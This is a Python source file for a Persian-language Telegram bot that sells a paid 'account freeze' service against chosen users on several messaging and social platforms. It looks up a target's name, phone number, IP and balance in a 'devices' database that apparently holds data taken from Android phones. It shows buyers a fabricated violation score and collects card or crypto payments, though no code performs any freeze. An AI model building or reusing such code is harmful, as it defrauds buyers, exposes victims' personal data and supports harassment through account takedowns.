import logging

import aiomysql
from aiogram import F, Router
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from config import ADMIN_IDS

log = logging.getLogger(__name__)
ADMIN_ID = ADMIN_IDS[0]

router = Router()


class FreezeStates(StatesGroup):
    freeze_id = State()
    confirm = State()
    payment = State()
    receipt = State()
    hash = State()


def kb_platforms():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="تلگرام ⭕", callback_data="fp_telegram", style="primary"
                )
            ],
            [
                InlineKeyboardButton(
                    text="واتساپ ⭕", callback_data="fp_whatsapp", style="primary"
                )
            ],
            [
                InlineKeyboardButton(
                    text="روبیکا ⭕", callback_data="fp_rubika", style="primary"
                )
            ],
            [
                InlineKeyboardButton(
                    text="سروش پلاس ⭕", callback_data="fp_soroush", style="primary"
                )
            ],
            [
                InlineKeyboardButton(
                    text="اینستاگرام ⭕", callback_data="fp_instagram", style="primary"
                )
            ],
            [
                InlineKeyboardButton(
                    text="توییتر ⭕", callback_data="fp_twitter", style="primary"
                )
            ],
            [
                InlineKeyboardButton(
                    text="دیسکورد ⭕", callback_data="fp_discord", style="primary"
                )
            ],
            [
                InlineKeyboardButton(
                    text="بازگشت به منو 🔙", callback_data="menu_home", style="danger"
                )
            ],
        ]
    )


def kb_freeze_confirm():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✅ تایید و ادامه", callback_data="freeze_ok")],
            [InlineKeyboardButton(text="❌ لغو", callback_data="menu_remote")],
        ]
    )


def kb_freeze_payment():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💳 کارت به کارت", callback_data="fp_pay_card")],
            [
                InlineKeyboardButton(
                    text="💎 ارز دیجیتال", callback_data="fp_pay_crypto"
                )
            ],
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="menu_remote")],
        ]
    )


async def send_or_edit(cb, text, reply_markup=None):
    try:
        if cb.message.text:
            await cb.message.edit_text(
                text, reply_markup=reply_markup, parse_mode="HTML"
            )
            return
        elif cb.message.caption is not None:
            await cb.message.edit_caption(
                caption=text, reply_markup=reply_markup, parse_mode="HTML"
            )
            return
    except Exception as e:
        log.error(f"send_or_edit edit err: {e}")
    try:
        await cb.message.delete()
    except Exception:
        pass
    try:
        await cb.message.answer(text, reply_markup=reply_markup, parse_mode="HTML")
    except Exception as e:
        log.error(f"send_or_edit send err: {e}")


@router.callback_query(F.data == "sub_freeze")
async def cb_sub_freeze(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    await send_or_edit(
        cb,
        "🌐 <b>انتخاب پلتفرم</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "سرویس مورد نظر خود را انتخاب کنید:",
        reply_markup=kb_platforms(),
    )
    await cb.answer()


@router.callback_query(
    F.data.in_(
        [
            "fp_telegram",
            "fp_whatsapp",
            "fp_rubika",
            "fp_soroush",
            "fp_instagram",
            "fp_twitter",
            "fp_discord",
        ]
    )
)
async def cb_freeze_platform(cb: CallbackQuery, state: FSMContext):
    platform = cb.data.replace("fp_", "")
    platforms = {
        "telegram": "تلگرام",
        "whatsapp": "واتساپ",
        "rubika": "روبیکا",
        "soroush": "سروش پلاس",
        "instagram": "اینستاگرام",
        "twitter": "توییتر",
        "discord": "دیسکورد",
    }
    if platform not in platforms:
        await cb.answer("❌")
        return
    await state.update_data(
        freeze_platform=platform, freeze_platform_name=platforms[platform]
    )
    await state.set_state(FreezeStates.freeze_id)
    await send_or_edit(
        cb,
        f"📱 <b>پلتفرم انتخاب شده:</b> {platforms[platform]}\n"
        f"🆔 حالا <b>آیدی عددی</b> کاربر مورد نظر رو بفرست:",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🔙 بازگشت", callback_data="sub_freeze")]
            ]
        ),
    )
    await cb.answer()


@router.message(FreezeStates.freeze_id)
async def on_freeze_id(m: Message, state: FSMContext):
    user_id_str = m.text.strip()
    if not user_id_str.isdigit():
        await m.answer("❌ آیدی باید عددی باشه. دوباره بفرست:")
        return
    await state.update_data(freeze_id=user_id_str)
    await m.answer("⏳ در حال تحلیل اکانت...")
    try:
        conn = await aiomysql.connect(
            host="127.0.0.1",
            port=3306,
            user="devixorit404",
            password="devixorit404",
            db="devixorit404",
        )
        async with conn.cursor(aiomysql.DictCursor) as cur:
            await cur.execute(
                "SELECT * FROM devices WHERE android_id=%s OR full_name LIKE %s LIMIT 1",
                (user_id_str, f"%{user_id_str}%"),
            )
            device = await cur.fetchone()
        conn.close()
    except Exception as e:
        device = None
        log.error(f"freeze mysql err: {e}")
    data = await state.get_data()
    platform_name = data.get("freeze_platform_name", "نامشخص")
    if device:
        analysis = (
            f"🔍 <b>نتیجه آنالیز هوشمند اکانت</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 پلتفرم: <b>{platform_name}</b>\n"
            f"🆔 آیدی: <code>{user_id_str}</code>\n"
            f"👤 نام: <b>{device.get('full_name') or 'نامشخص'}</b>\n"
            f"📱 شماره: <b>{device.get('phone_numbers') or 'نامشخص'}</b>\n"
            f"🏙 شهر: <b>{device.get('ip') or 'نامشخص'}</b>\n"
            f"📊 وضعیت: <b>{device.get('status') or 'نامشخص'}</b>\n"
            f"💰 موجودی: <b>{device.get('avg_balance') or '0'} تومان</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ درصد تخلف اکانت: <b>75%</b>\n"
            f"⏱ زمان فریز کامل: <b>10 دقیقه</b>\n"
            f"❓ آیا از خرید سرویس فریز اکانت برای این اکانت مطمئن هستید؟"
        )
    else:
        analysis = (
            f"🔍 <b>نتیجه آنالیز هوشمند اکانت</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 پلتفرم: <b>{platform_name}</b>\n"
            f"🆔 آیدی: <code>{user_id_str}</code>\n"
            f"👤 نام: <b>نامشخص</b>\n"
            f"📊 وضعیت: <b>فعال</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ درصد تخلف اکانت: <b>75%</b>\n"
            f"⏱ زمان فریز کامل: <b>10 دقیقه</b>\n"
            f"❓ آیا از خرید سرویس فریز اکانت برای این اکانت مطمئن هستید؟"
        )
    await m.answer(analysis, reply_markup=kb_freeze_confirm())
    await state.set_state(FreezeStates.confirm)


@router.callback_query(F.data == "freeze_ok")
async def cb_freeze_ok(cb: CallbackQuery, state: FSMContext):
    await state.set_state(FreezeStates.payment)
    await send_or_edit(
        cb,
        "💳 <b>مرحله ۲ از ۳ — انتخاب روش پرداخت</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💵 هزینه سرویس: <b>۵۰۰,۰۰۰ تومان</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "روش پرداخت مورد نظرتون رو انتخاب کنید:",
        reply_markup=kb_freeze_payment(),
    )
    await cb.answer()


@router.callback_query(F.data.startswith("fp_pay_"))
async def cb_freeze_pay(cb: CallbackQuery, state: FSMContext):
    method = cb.data.replace("fp_pay_", "")
    if method == "wallet":
        await state.clear()
        await cb.message.answer("💳 پرداخت از موجودی به زودی فعال می‌شه")
        await cb.answer()
        return
    if method == "card":
        await state.set_state(FreezeStates.receipt)
        try:
            await cb.message.delete()
        except Exception:
            pass
        card_text = (
            "💳 <b>پرداخت کارت به کارت</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "💵 مبلغ: <b>۵۰۰,۰۰۰ تومان</b>\n"
            "🏦 <b>شماره کارت:</b>\n"
            "<code>6219861809389223</code>\n"
            "👤 <b>به نام:</b> صاحب کارت\n"
            "📝 <b>پس از واریز، عکس رسید را ارسال کنید.</b>"
        )
        await cb.bot.send_message(cb.from_user.id, card_text, parse_mode="HTML")
        await cb.answer("✅")
        return
    if method == "crypto":
        await state.set_state(FreezeStates.hash)
        try:
            await cb.message.delete()
        except Exception:
            pass
        text = (
            "💎 <b>پرداخت با ارز دیجیتال</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "💵 مبلغ: <b>۵۰۰,۰۰۰ تومان</b> ≈ <b>۱۰ تتر</b>\n"
            "🏦 کیف پول:\n"
            "<code>TKfYCpwFUhaXsptu3uGcMqzqmwF8HvQSQw</code>\n"
            "📝 پس از واریز، <b>هش تراکنش</b> رو بفرست:"
        )
        await cb.bot.send_message(cb.from_user.id, text, parse_mode="HTML")
        await cb.answer("✅")
        return
    await cb.answer("❌ روش نامعتبر", show_alert=True)


@router.message(FreezeStates.receipt, F.photo)
async def on_freeze_receipt(m: Message, state: FSMContext):
    data = await state.get_data()
    platform = data.get("freeze_platform_name", "نامشخص")
    target = data.get("freeze_id", "نامشخص")
    photo_id = m.photo[-1].file_id
    admin_text = (
        f"💳 <b>رسید کارت به کارت — فریز اکانت</b>\n"
        f"👤 کاربر: {m.from_user.first_name}\n"
        f"🆔 آیدی: <code>{m.from_user.id}</code>\n"
        f"🌐 پلتفرم: <b>{platform}</b>\n"
        f"🎯 هدف: <code>{target}</code>\n"
        f"💵 مبلغ: <b>۵۰۰,۰۰۰ تومان</b>"
    )
    admin_kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ تایید", callback_data=f"freeze_approve_{m.from_user.id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="❌ رد", callback_data=f"freeze_reject_{m.from_user.id}"
                )
            ],
        ]
    )
    try:
        await m.bot.send_photo(
            ADMIN_ID, photo=photo_id, caption=admin_text, reply_markup=admin_kb
        )
    except Exception as e:
        log.error(f"admin photo err: {e}")
    await m.answer("✅ رسید شما ارسال شد. پس از تایید، اکانت فریز می‌شه.")
    await state.clear()


@router.message(FreezeStates.hash)
async def on_freeze_hash(m: Message, state: FSMContext):
    tx_hash = m.text.strip()
    if len(tx_hash) < 10:
        await m.answer("❌ هش معتبر نیست. دوباره بفرست:")
        return
    data = await state.get_data()
    platform = data.get("freeze_platform_name", "نامشخص")
    target = data.get("freeze_id", "نامشخص")
    admin_text = (
        f"💎 <b>هش تراکنش — فریز اکانت</b>\n"
        f"👤 کاربر: {m.from_user.first_name}\n"
        f"🆔 آیدی: <code>{m.from_user.id}</code>\n"
        f"🌐 پلتفرم: <b>{platform}</b>\n"
        f"🎯 هدف: <code>{target}</code>\n"
        f"🔗 هش: <code>{tx_hash}</code>"
    )
    admin_kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ تایید", callback_data=f"freeze_approve_{m.from_user.id}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="❌ رد", callback_data=f"freeze_reject_{m.from_user.id}"
                )
            ],
        ]
    )
    try:
        await m.bot.send_message(ADMIN_ID, admin_text, reply_markup=admin_kb)
    except Exception:
        pass
    await m.answer("✅ هش شما ارسال شد. پس از تایید، اکانت فریز می‌شه.")
    await state.clear()


@router.callback_query(F.data.startswith("freeze_approve_"))
async def cb_freeze_approve(cb: CallbackQuery):
    uid = int(cb.data.split("_")[2])
    try:
        await cb.bot.send_message(
            uid,
            "🎉 <b>درخواست فریز اکانت شما تایید شد!</b>\n"
            "⏱ اکانت در حال فریز شدن است.\n"
            "زمان تخمینی: ۱۰ دقیقه",
        )
    except Exception:
        pass
    await cb.message.edit_reply_markup(reply_markup=None)
    await cb.answer("✅ تایید شد")


@router.callback_query(F.data.startswith("freeze_reject_"))
async def cb_freeze_reject(cb: CallbackQuery):
    uid = int(cb.data.split("_")[2])
    try:
        await cb.bot.send_message(uid, "❌ درخواست فریز اکانت شما رد شد.")
    except Exception:
        pass
    await cb.message.edit_reply_markup(reply_markup=None)
    await cb.answer("❌ رد شد")
